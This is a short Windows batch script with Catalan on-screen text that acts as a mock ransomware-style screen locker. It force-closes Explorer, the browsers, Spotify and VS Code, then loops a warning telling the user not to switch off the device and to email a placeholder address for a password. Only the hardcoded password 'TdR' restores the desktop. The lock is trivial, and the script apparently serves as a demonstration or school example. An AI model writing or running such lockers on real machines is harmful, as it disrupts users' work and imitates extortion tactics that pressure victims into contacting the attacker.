color 0A
@echo off
title Exemple
taskkill /f /IM explorer.exe
taskkill /IM chrome.exe /F
taskkill /IM msedge.exe /F
taskkill /IM firefox.exe /F
taskkill /IM spotify.exe /F
taskkill /IM code.exe /F
:bucle
cls
echo LLEGEIX AMB ATENCIO!
echo =========================================================
echo NO APAGUIS EL DISPOSITIU.
echo =========================================================
echo ESCRIU A correu@exemple.com PER OBTINDRE LA CONTRASENYA (CONTRASENYA QUE HAS VIST A LA PAGINA).
echo =========================================================
echo NO TANQUIS AQUESTA FINESTRA
echo =========================================================
set /p pass=Contrasenya:
if %pass%==TdR (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Molt be! Et torno el teu dispositiu.
start explorer.exe
pause
exit